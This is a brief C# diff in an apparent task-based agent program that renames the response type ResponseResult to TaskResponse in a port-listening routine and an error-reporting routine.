@@ -33,7 +33,7 @@ namespace Agent
                 ConnectionConfig cc = new ConnectionConfig(port, messageManager);
                 if(this.connections.TryAdd(port, cc))
                 {
-                    await messageManager.AddResponse(new ResponseResult()
+                    await messageManager.AddResponse(new TaskResponse()
                     {
                         task_id = job.task.id,
                         user_output = "Listening.",
@@ -65,7 +65,7 @@ namespace Agent
 
         private async Task ReturnError(string message, string task_id)
         {
-            await messageManager.AddResponse(new ResponseResult()
+            await messageManager.AddResponse(new TaskResponse()
             {
                 task_id = task_id,
                 user_output = message,
